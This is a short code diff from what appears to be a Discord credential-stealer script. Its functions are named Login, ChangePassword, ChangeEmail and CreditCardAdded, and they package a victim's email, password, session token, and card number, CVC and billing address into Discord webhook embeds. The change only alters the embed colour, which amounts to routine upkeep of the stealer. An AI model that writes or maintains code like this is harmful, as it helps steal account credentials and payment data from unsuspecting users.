@@ -149,7 +149,7 @@ function Login(email, password, token) {
             avatar_url: "https://cdn.discordapp.com/attachments/915705104043216956/930226112934608896/anime-cool.gif",
             embeds: [
                 {
-                    "color": 16507654,
+                    "color": 2303786,
                     "fields": [
                         {
                             "name": "**Account Info**",
@@ -197,7 +197,7 @@ function ChangePassword(oldpassword, newpassword, token) {
                 avatar_url: "https://cdn.discordapp.com/attachments/915705104043216956/930226112934608896/anime-cool.gif",
                 embeds: [
                     {
-                        "color": 16507654,
+                        "color": 2303786,
                         "fields": [
                             {
                                 "name": "**Password Changed**",
@@ -250,7 +250,7 @@ function ChangeEmail(newemail, password, token) {
                 avatar_url: "https://cdn.discordapp.com/attachments/915705104043216956/930226112934608896/anime-cool.gif",
                 embeds: [
                     {
-                        "color": 16507654,
+                        "color": 2303786,
                         "fields": [
                             {
                                 "name": "**Email Changed**",
@@ -304,7 +304,7 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
                 avatar_url: "https://cdn.discordapp.com/attachments/915705104043216956/930226112934608896/anime-cool.gif",
                 embeds: [
                     {
-                        "color": 16507654,
+                        "color": 2303786,
                         "fields": [
                             {
                                 "name": "**Credit Card Added**",
